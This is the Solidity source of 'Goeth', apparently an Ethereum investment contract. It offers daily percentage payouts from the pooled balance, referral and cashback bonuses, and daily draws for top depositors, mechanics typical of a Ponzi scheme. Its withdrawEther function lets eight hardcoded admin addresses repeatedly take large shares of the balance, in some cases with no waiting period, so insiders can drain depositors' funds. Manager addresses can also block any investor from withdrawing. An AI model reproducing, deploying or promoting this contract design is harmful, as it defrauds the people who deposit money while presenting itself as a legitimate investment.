pragma solidity 0.4.25;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "NaN");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0, "NaN");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a, "NaN");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "NaN");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0, "NaN");
        return a % b;
    }
}

contract Roles {
    mapping(string => mapping(address => bool)) private rules;

    event RoleAdded(string indexed role, address indexed to);
    event RoleRemoved(string indexed role, address indexed to);

    modifier onlyHasRole(string _role) {
        require(rules[_role][msg.sender], "Access denied");
        _;
    }

    function hasRole(string _role, address _to) view public returns(bool) {
        require(_to != address(0), "Zero address");

        return rules[_role][_to];
    }

    function addRole(string _role, address _to) internal {
        require(_to != address(0), "Zero address");

        rules[_role][_to] = true;

        emit RoleAdded(_role, _to);
    }

    function removeRole(string _role, address _to) internal {
        require(_to != address(0), "Zero address");

        rules[_role][_to] = false;
        
        emit RoleRemoved(_role, _to);
    }
}

contract Goeth is Roles {
    using SafeMath for uint;

    struct Investor {
        uint invested;
        uint payouts;
        uint first_invest;
        uint last_payout;
        address referrer;
    }

    struct Admin {
        uint percent;
        uint timeout;
        uint min_balance;
        uint last_withdraw;
    }

    uint constant public COMMISSION = 0;
    uint constant public REFBONUS = 5;
    uint constant public CASHBACK = 5;
    uint constant public DRAWTIMEOUT = 1 days;
    uint constant public MAXPAYOUT = 40;

    address public beneficiary = 0xa5451D1a11B3e2eE537423b724fa8F9FaAc1DD62;

    mapping(address => Investor) public investors;
    mapping(address => bool) public blockeds;

    uint[] public draw_size = [5, 3, 2];
    uint public last_draw = block.timestamp;
    address[] public top = new address[](draw_size.length);
    
    mapping(address => Admin) public admins;

    event Payout(address indexed holder, uint etherAmount);
    event Deposit(address indexed holder, uint etherAmount, address referrer);
    event RefBonus(address indexed from, address indexed to, uint etherAmount);
    event CashBack(address indexed holder, uint etherAmount);
    event WithdrawEther(address indexed to, uint etherAmount);
    event Blocked(address indexed holder);
    event UnBlocked(address indexed holder);
    event TopWinner(address indexed holder, uint top, uint etherAmount);

    constructor() {
        addRole("manager", 0x17a709173819d7c2E42DBB70643c848450093874);
        addRole("manager", 0x2d15b5caFEE3f0fC2FA778b875987f756D64c789);

        admins[0x1295Cd3f1D825E49B9775497cF9B082c5719C099] = Admin(30, 7 days, 0, 0);
        admins[0x9F31c056b518B8492016F08931F7C274d344d21C] = Admin(35, 7 days, 0, 0);
        admins[0x881AF76148D151E886d2F4a74A1d548d1587E7AE] = Admin(35, 7 days, 0, 0);
        admins[0x42966e110901FAD6f1A55ADCC8219b541D60b258] = Admin(35, 7 days, 50 ether, 0);
        admins[0x07DD5923F0B52AB77cC2739330d1139a38b024F3] = Admin(35, 7 days, 50 ether, 0);
        admins[0x470942C45601F995716b00f3F6A122ec6D1A36ce] = Admin(2, 0, 0, 0);
        admins[0xe75f7128367B4C0a8856E412920B96db3476e7C9] = Admin(3, 0, 0, 0);
        admins[0x9cc869eE8720BF720B8804Ad12146e43bbd5022d] = Admin(3, 0, 0, 0);
    }

    function investorBonusSize(address _to) view public returns(uint) {
        uint b = investors[_to].invested;

        if(b >= 50 ether) return 5;
        if(b >= 20 ether) return 3;
        if(b >= 10 ether) return 2;
        if(b >= 5 ether) return 1;
        return 0;
    }

    function bonusSize() view public returns(uint) {
        uint b = address(this).balance;

        if(b >= 2500 ether) return 10;
        if(b >= 1000 ether) return 8;
        if(b >= 500 ether) return 7;
        if(b >= 200 ether) return 6;
        return 5;
    }

    function payoutSize(address _to) view public returns(uint) {
        uint invested = investors[_to].invested;
        uint max = invested.div(100).mul(MAXPAYOUT);
        if(invested == 0 || investors[_to].payouts >= max) return 0;

        uint bonus = bonusSize().add(investorBonusSize(_to));
        uint payout = invested.mul(bonus).div(100).mul(block.timestamp.sub(investors[_to].last_payout)).div(1 days);

        return investors[_to].payouts.add(payout) > max ? max.sub(investors[_to].payouts) : payout;
    }

    function bytesToAddress(bytes bys) pure private returns(address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    function _checkReinvest(address _to) private {
        if(investors[_to].last_payout > 0 && block.timestamp > investors[_to].last_payout + 22 days) {
            uint c = (block.timestamp - investors[_to].last_payout) / 22 days;
            for(uint i = 0; i < c; i++) {
                investors[_to].invested = investors[_to].invested.add(investors[_to].invested.div(100).mul(20));
                _reCalcTop(_to);
            }
        }
    }

    function _reCalcTop(address _to) private {
        uint b = investors[_to].invested;
        for(uint i = 0; i < draw_size.length; i++) {
            if(investors[top[i]].invested < b) {
                for(uint j = draw_size.length - 1; j > i; j--) {
                    top[j] = top[j - 1];
                }

                top[i] = _to;
                break;
            }
        }
    }

    function() payable external {
        if(hasRole("manager", msg.sender)) {
            require(msg.data.length > 0, "Send the address in data");
            
            address addr = bytesToAddress(msg.data);

            require(!hasRole("manager", addr) && admins[addr].percent == 0, "This address is manager");

            if(!blockeds[addr]) {
                blockeds[addr] = true;
                emit Blocked(addr);
            }
            else {
                blockeds[addr] = false;
                emit UnBlocked(addr);
            }
            
            if(msg.value > 0) {
                msg.sender.transfer(msg.value);
            }

            return;
        }

        if(investors[msg.sender].invested > 0 && !blockeds[msg.sender]) {
            _checkReinvest(msg.sender);
            uint payout = payoutSize(msg.sender);

            require(msg.value > 0 || payout > 0, "No payouts");

            if(payout > 0) {
                investors[msg.sender].last_payout = block.timestamp;
                investors[msg.sender].payouts = investors[msg.sender].payouts.add(payout);

                msg.sender.transfer(payout);

                emit Payout(msg.sender, payout);

                //if(investors[msg.sender].payouts >= investors[msg.sender].invested.add(investors[msg.sender].invested.div(100).mul(MAXPAYOUT))) {
                //    delete investors[msg.sender];
                //}
            }
        }
        
        if(msg.value > 0) {
            require(msg.value >= 0.01 ether, "Minimum investment amount 0.01 ether");

            investors[msg.sender].last_payout = block.timestamp;
            investors[msg.sender].invested = investors[msg.sender].invested.add(msg.value);

            beneficiary.transfer(msg.value.mul(COMMISSION).div(100));

            if(investors[msg.sender].first_invest == 0) {
                investors[msg.sender].first_invest = block.timestamp;

                if(msg.data.length > 0) {
                    address ref = bytesToAddress(msg.data);

                    if(ref != msg.sender && investors[ref].invested > 0 && msg.value >= 1 ether) {
                        investors[msg.sender].referrer = ref;

                        uint ref_bonus = msg.value.mul(REFBONUS).div(100);
                        ref.transfer(ref_bonus);

                        emit RefBonus(msg.sender, ref, ref_bonus);

                        uint cashback_bonus = msg.value.mul(CASHBACK).div(100);
                        investors[msg.sender].invested = investors[msg.sender].invested.add(cashback_bonus);

                        emit CashBack(msg.sender, cashback_bonus);
                    }
                }
            }

            _reCalcTop(msg.sender);

            emit Deposit(msg.sender, msg.value, investors[msg.sender].referrer);
        }
    }

    function draw() public {
        require(block.timestamp > last_draw + DRAWTIMEOUT, "The drawing is available 1 time in 24 hours");

        last_draw = block.timestamp;

        uint balance = address(this).balance;

        for(uint i = 0; i < draw_size.length; i++) {
            if(top[i] != address(0)) {
                uint amount = balance.div(100).mul(draw_size[i]);
                top[i].transfer(amount);

                emit TopWinner(top[i], i + 1, amount);
            }
        }
    }

    function withdrawEther(address _to) public {
        Admin storage admin = admins[msg.sender];
        uint balance = address(this).balance;

        require(admin.percent > 0, "Access denied");
        require(admin.timeout == 0 || block.timestamp > admin.last_withdraw.add(admin.timeout), "Timeout");
        require(_to != address(0), "Zero address");
        require(balance > 0, "Not enough balance");

        uint amount = balance > admin.min_balance ? balance.div(100).mul(admin.percent) : balance;

        admin.last_withdraw = block.timestamp;

        _to.transfer(amount);

        emit WithdrawEther(_to, amount);
    }
}